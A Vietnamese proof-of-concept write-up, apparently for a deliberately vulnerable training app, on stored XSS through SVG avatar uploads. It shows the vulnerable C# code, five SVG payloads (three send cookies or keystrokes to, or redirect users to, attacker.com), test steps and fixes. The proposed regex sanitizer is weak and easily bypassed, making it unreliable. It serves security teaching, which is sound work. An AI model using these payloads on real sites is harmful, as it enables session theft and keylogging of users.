# Proof of Concept (PoC) - Lỗ hổng XSS trong SVG File

## Mô tả lỗ hổng

**Loại lỗ hổng**: Cross-Site Scripting (XSS) - Stored XSS via SVG File  
**Endpoint upload**: `POST /Home/UploadAvatar`  
**Endpoint view**: `GET /SecureFile/Avatar/{fileName}`  
**Mức độ**: Medium-High  
**Mô tả**: Hệ thống cho phép upload file SVG làm avatar. Khi SVG được serve với content-type `image/svg+xml`, browser sẽ render nó như HTML, cho phép JavaScript trong SVG được thực thi. Attacker có thể upload SVG chứa JavaScript độc hại, và khi người dùng khác xem avatar, JavaScript sẽ được thực thi trong context của họ.

## Nguyên nhân

1. **Cho phép upload file SVG**: Endpoint `/Home/UploadAvatar` cho phép upload file `.svg` ngoài các định dạng ảnh thông thường
2. **Serve SVG với content-type `image/svg+xml`**: Endpoint `/SecureFile/Avatar/{fileName}` serve SVG với content-type `image/svg+xml`, khiến browser render SVG như HTML
3. **Không sanitize nội dung SVG**: SVG file được serve trực tiếp mà không kiểm tra hoặc loại bỏ JavaScript

**Code có lỗ hổng:**

```csharp
// HomeController.cs - Cho phép upload SVG
var allowedExtensions = new[] { ".jpg", ".jpeg", ".png", ".gif", ".webp", ".svg" }; // VULNERABILITY

// SecureFileController.cs - Serve SVG với image/svg+xml
if (extension == ".svg")
{
    return "image/svg+xml"; // VULNERABILITY: Browser renders SVG as HTML
}
```

## Các bước thực hiện PoC

### Bước 1: Chuẩn bị môi trường

1. Đảm bảo ứng dụng đang chạy trên `http://localhost:5000`
2. Có tài khoản để upload avatar
3. Có tài khoản khác để xem avatar (hoặc xem trong cùng tài khoản)

### Bước 2: Tạo SVG payload với JavaScript

**Payload 1: Alert đơn giản**

Tạo file `xss_payload.svg`:

```svg
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS in SVG - Avatar')">
  <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
  <script>
    alert('XSS via SVG file - Stored XSS');
  </script>
</svg>
```

**Payload 2: Cookie stealing**

Tạo file `xss_cookie.svg`:

```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="40" fill="red" />
  <script>
    var img = new Image();
    img.src = 'http://attacker.com/steal?cookie=' + document.cookie;
  </script>
</svg>
```

**Payload 3: Keylogger**

Tạo file `xss_keylogger.svg`:

```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <rect width="100" height="100" fill="blue" />
  <script>
    document.onkeypress = function(e) {
      new Image().src = 'http://attacker.com/keylog?key=' + e.key;
    };
  </script>
</svg>
```

**Payload 4: Phishing/Form hijacking**

Tạo file `xss_phishing.svg`:

```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="40" fill="green" />
  <script>
    // Redirect to phishing page
    if (window.location.href.indexOf('Profile') > -1) {
      window.location.href = 'http://attacker.com/phishing';
    }
  </script>
</svg>
```

**Payload 5: DOM manipulation**

Tạo file `xss_dom.svg`:

```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <rect width="100" height="100" fill="yellow" />
  <script>
    // Modify page content
    if (document.body) {
      document.body.innerHTML = '<h1>Hacked by XSS!</h1>';
    }
  </script>
</svg>
```

### Bước 3: Upload SVG file

1. **Đăng nhập** với tài khoản bất kỳ
2. **Truy cập**: `http://localhost:5000/Home/Profile`
3. **Upload file SVG** (ví dụ: `xss_payload.svg`)
4. **Xác nhận** upload thành công

### Bước 4: Xác minh lỗ hổng

**Cách 1: Xem avatar trong Profile**

1. Sau khi upload, avatar sẽ hiển thị trong trang Profile
2. **Quan sát**: JavaScript trong SVG sẽ được thực thi
3. Alert sẽ xuất hiện hoặc script sẽ chạy

**Cách 2: Truy cập trực tiếp URL**

1. Lấy tên file SVG từ avatar URL (ví dụ: `1_abc123.svg`)
2. **Truy cập**: `http://localhost:5000/SecureFile/Avatar/1_abc123.svg`
3. **Quan sát**: 
   - Browser sẽ render SVG như HTML
   - JavaScript sẽ được thực thi
   - Alert sẽ xuất hiện hoặc script sẽ chạy

**Cách 3: Xem trong Developer Tools**

1. Mở Developer Tools (F12)
2. Vào tab Console
3. Xem các log hoặc lỗi từ JavaScript trong SVG
4. Vào tab Network để xem các request được gửi đi (nếu payload có fetch/XHR)

### Bước 5: Test với các payload khác

1. Upload payload cookie stealing
2. Upload payload keylogger
3. Upload payload phishing
4. Xác nhận mỗi payload hoạt động như mong đợi

## Kết quả mong đợi

- ✅ SVG file được upload thành công
- ✅ SVG được serve với content-type `image/svg+xml`
- ✅ Browser render SVG như HTML
- ✅ JavaScript trong SVG được thực thi
- ✅ Alert hiển thị hoặc script thực thi thành công
- ✅ Cookie có thể bị đánh cắp (nếu payload có chức năng này)

## Tác động

1. **Cookie Theft**: Attacker có thể đánh cắp session cookie của người dùng xem avatar
2. **Session Hijacking**: Attacker có thể chiếm quyền session của người dùng
3. **Phishing**: Attacker có thể redirect người dùng đến trang phishing
4. **Keylogging**: Attacker có thể ghi lại các phím bấm của người dùng
5. **Defacement**: Attacker có thể thay đổi giao diện trang web
6. **Malware Distribution**: Attacker có thể redirect người dùng đến trang chứa malware

## Cách khắc phục

1. **Không cho phép upload SVG**: Chỉ cho phép các định dạng ảnh raster (JPG, PNG, GIF, WEBP)
2. **Sanitize SVG content**: Loại bỏ các thẻ `<script>`, event handlers (`onload`, `onerror`, etc.), và các element nguy hiểm
3. **Serve SVG với content-type khác**: Serve SVG với `application/octet-stream` hoặc `text/plain` để browser không render nó
4. **Content Security Policy (CSP)**: Thêm CSP headers để ngăn chặn inline scripts
5. **Convert SVG to raster**: Convert SVG sang PNG/JPG trước khi lưu

**Code sửa lỗi:**

```csharp
// HomeController.cs - Không cho phép SVG
var allowedExtensions = new[] { ".jpg", ".jpeg", ".png", ".gif", ".webp" }; // Không có .svg

// Hoặc nếu cần SVG, sanitize nội dung:
private string SanitizeSvg(string svgContent)
{
    // Remove script tags
    svgContent = Regex.Replace(svgContent, @"<script[^>]*>.*?</script>", "", RegexOptions.IgnoreCase | RegexOptions.Singleline);
    
    // Remove event handlers
    svgContent = Regex.Replace(svgContent, @"\s*on\w+\s*=\s*[""'][^""']*[""']", "", RegexOptions.IgnoreCase);
    
    return svgContent;
}

// SecureFileController.cs - Serve SVG với content-type an toàn
if (extension == ".svg")
{
    return "application/octet-stream"; // Browser sẽ download, không render
}
```

## Chi tiết kỹ thuật

### Vấn đề trong code:

**File:** `Controllers/View/HomeController.cs`

```csharp
// VULNERABILITY: Allow SVG files
var allowedExtensions = new[] { ".jpg", ".jpeg", ".png", ".gif", ".webp", ".svg" };
var allowedMimeTypes = new[] { "image/jpeg", "image/jpg", "image/png", "image/gif", "image/webp", "image/svg+xml", "image/svg" };
```

**File:** `Controllers/View/SecureFileController.cs`

```csharp
// VULNERABILITY: Serve SVG with image/svg+xml content-type
if (extension == ".svg")
{
    return "image/svg+xml"; // Browser renders as HTML
}
```

### Flow của lỗ hổng:

1. **Attacker upload SVG** chứa JavaScript qua `/Home/UploadAvatar`
2. **SVG được lưu** vào `Storage/Avatars/`
3. **Người dùng xem avatar** qua `/SecureFile/Avatar/{fileName}`
4. **Server serve SVG** với content-type `image/svg+xml`
5. **Browser render SVG** như HTML
6. **JavaScript trong SVG** được thực thi → XSS

### Cách khai thác:

1. **Tạo SVG payload** với JavaScript
2. **Upload SVG** qua endpoint `/Home/UploadAvatar`
3. **Xem avatar** trong Profile hoặc truy cập trực tiếp URL
4. **JavaScript thực thi** → XSS exploited

## Lưu ý

- Lỗ hổng này được tạo ra **có chủ đích** cho mục đích training/giáo dục về bảo mật
- Trong môi trường production, **KHÔNG BAO GIỜ** cho phép upload SVG từ user input
- Nếu cần SVG, **luôn sanitize** nội dung trước khi lưu
- **Content Security Policy (CSP)** có thể giảm thiểu tác động nhưng không phải giải pháp hoàn toàn
- **SVG là XML**, có thể chứa JavaScript và được browser render như HTML
- **Stored XSS** nguy hiểm hơn Reflected XSS vì ảnh hưởng đến tất cả người dùng xem avatar

## Checklist test

- [ ] Tạo SVG payload với JavaScript
- [ ] Upload SVG qua `/Home/UploadAvatar`
- [ ] Xác nhận upload thành công
- [ ] Xem avatar trong Profile và xác nhận JavaScript thực thi
- [ ] Truy cập trực tiếp URL `/SecureFile/Avatar/{fileName}` và xác nhận JavaScript thực thi
- [ ] Test với các payload khác nhau (alert, cookie stealing, keylogger)
- [ ] Kiểm tra Browser Console để xem có lỗi gì không
- [ ] Verify SVG được serve với content-type `image/svg+xml`

